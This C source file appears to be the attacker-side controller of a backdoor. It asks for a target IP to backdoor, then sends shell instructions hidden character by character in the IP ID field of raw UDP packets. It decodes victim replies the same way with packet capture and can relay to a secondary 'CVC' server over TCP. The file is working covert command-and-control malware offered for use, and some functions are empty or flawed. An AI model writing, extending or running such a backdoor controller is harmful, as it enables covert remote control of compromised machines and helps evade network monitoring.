#include "attacker.h"

int main(void) {
    struct options_attacker opts;
    u_char* args = NULL;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char* nic_interface;
    bpf_u_int32 netp, maskp;
    pcap_t* nic_fd;
    struct bpf_program fp;
    pthread_t udp_thread, tcp_thread;

    check_root_user();
    signal(SIGINT,sig_handler);
    program_setup();
    options_attacker_init(&opts);
    get_victim_ip(&opts);
    nic_interface = pcap_lookupdev(errbuf);
    get_my_ip(nic_interface, &opts);
    puts("============ Initialize program ============");
    fflush(stdout);


    if (pthread_create(&udp_thread, NULL, udp_select_call, (void*)&opts) != 0) {
        perror("pthread_create error");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&tcp_thread, NULL, cvc_checker, (void*)&opts) != 0) {
        perror("pthread_create error");
        exit(EXIT_FAILURE);
    }

    pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
    nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
    args = (u_char*)&opts;
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);
    return EXIT_SUCCESS;
}


void options_attacker_init(struct options_attacker *opts) {
    memset(opts, 0, sizeof(struct options_attacker));
}


void get_victim_ip(struct options_attacker *opts) {
    uint8_t input_length;

    while (1) {
        printf("Enter [ TARGET IP ] to backdoor: ");
        fflush(stdout);
        fgets(opts->victim_ip, sizeof(opts->victim_ip), stdin);
        input_length = (uint8_t) strlen(opts->victim_ip);
        if (input_length > 0 && opts->victim_ip[input_length - 1] == '\n') {
            opts->victim_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->victim_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void create_attacker_udp_socket(struct options_attacker *opts, struct sockaddr_in* victim_address) {
    int enable = 1;
    memset(victim_address, 0, sizeof(struct sockaddr_in));

    opts->attacker_socket_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (opts->attacker_socket_udp == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(opts->attacker_socket_udp, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("Error setting IP_HDRINCL option");
        exit(EXIT_FAILURE);
    }


    // VICTIM SERVER
    victim_address->sin_family = AF_INET;
    victim_address->sin_port = htons(DEFAULT_PORT);
    victim_address->sin_addr.s_addr = inet_addr(opts->victim_ip);


    if (victim_address->sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}


void get_my_ip(char *nic_interface, struct options_attacker *opts) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, nic_interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    strcpy(opts->my_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}


unsigned short create_udp_header(struct udphdr* uh) {
    uh->source = htons(generate_random_port());
    uh->dest = htons(DEFAULT_PORT);
    uh->len = htons(sizeof(struct udphdr));
    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));

    return sizeof(struct udphdr);
}


unsigned short create_ip_header(struct iphdr* ih, char c, struct options_attacker *opts) {
    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = htons(hide_data((uint16_t)c));
    ih->tot_len = htons(28);
    ih->ttl = 64;
    ih->frag_off = 0;
    ih->protocol = IPPROTO_UDP;
    ih->saddr = host_convert(opts->my_ip);
    ih->daddr = host_convert(opts->victim_ip);
    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));

    return sizeof(struct iphdr);
}


void* udp_select_call(void* arg) {
    struct options_attacker *opts = (struct options_attacker*)arg;
    struct sockaddr_in victim_address;
    char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0};
    int byte;

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    struct iphdr ih;
    struct udphdr uh;
    size_t length = 0;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    create_attacker_udp_socket(opts, &victim_address);

    FD_ZERO(&reads);
    FD_SET(STDIN_FILENO, &reads);

    fd_max = STDIN_FILENO;

    while (1) {
        cpy_reads = reads;
        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (i == STDIN_FILENO) {
                    puts("============ RESULT ============");
                    if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                        opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
                        if (strstr(opts->victim_instruction, "cvc") != NULL) {
                            strcpy(opts->cvc_ip, opts->victim_instruction + 4);
                            opts->cvc = TRUE;
                        }
                        sprintf(instruction, "[[%s]]", opts->victim_instruction);
                        length = strlen(instruction);
                        for (int j = 0; j < length; j++) {
                            create_udp_header(&uh);
                            create_ip_header(&ih, instruction[j], opts);
                            memcpy(s_buffer, &ih, sizeof(struct iphdr));
                            memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
                            byte = (int)sendto(opts->attacker_socket_udp, (const char*)s_buffer, SEND_SIZE, 0,
                                          (const struct sockaddr*)&victim_address, sizeof(victim_address));
                            if (byte < 0) {
                                perror("send failed\n");
                            }
                            memset(s_buffer, 0, SEND_SIZE);
                        }
                        memset(instruction, 0, 64);
                    }
                }
            }
        }
    }
    close(opts->attacker_socket_udp);
    pthread_exit(NULL);
}


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ETHERNET - only handle IPv4 */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(args, pkthdr, packet);
    }
}


void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;
    struct iphdr *ip;

    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    printf("%c", (char)hide_data(ntohs(ip->id)));
}


int get_max_socket_number(struct options_attacker *opts) {

}


void* cvc_checker(void* arg) {
    struct options_attacker *opts = (struct options_attacker*)arg;
    struct sockaddr_in cvc_address;

    memset(&cvc_address, 0, sizeof(struct sockaddr_in));
    while (1) {
        if(opts->cvc == TRUE) break;
    }
    tcp_select_call(opts, cvc_address);
}


void create_attacker_cvc_socket(struct options_attacker *opts, struct sockaddr_in *cvc_address) {
    opts->attacker_socket_tcp = socket(AF_INET, SOCK_STREAM, 0);

    if (opts->attacker_socket_tcp == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    // VICTIM SERVER
    cvc_address->sin_family = AF_INET;
    cvc_address->sin_port = htons(CVC_PORT);
    cvc_address->sin_addr.s_addr = inet_addr(opts->cvc_ip);

    if (cvc_address->sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}



void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_address) {
    char buffer[RECEIVE_SIZE] = {0};

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    size_t length = 0;
    int enable = 1;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    create_attacker_cvc_socket(opts, &cvc_address);

    // VICTIM SERVER
    cvc_address.sin_family = AF_INET;
    cvc_address.sin_port = htons(CVC_PORT);
    cvc_address.sin_addr.s_addr = inet_addr(opts->cvc_ip);


    if (cvc_address.sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }

    sleep(2);
    if (connect(opts->attacker_socket_tcp, (struct sockaddr*)&cvc_address,
                sizeof(cvc_address)) < 0) {
        printf("connect() failed\n");
        exit(1);
    }

    FD_ZERO(&reads);
    FD_SET(opts->attacker_socket_tcp, &reads);


    fd_max = opts->attacker_socket_tcp;

    while (1) {
        cpy_reads = reads;
        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (opts->attacker_socket_tcp != 0) {
                    if (i == opts->attacker_socket_tcp) {
                        if (read(opts->attacker_socket_tcp, buffer, 256) > 0) {
                            printf("[ CVC SERVER ]: %s\n", buffer);
                            memset(buffer, 0, sizeof(char) * 256);
                        }
                    }
                }
            }
        }
    }
}


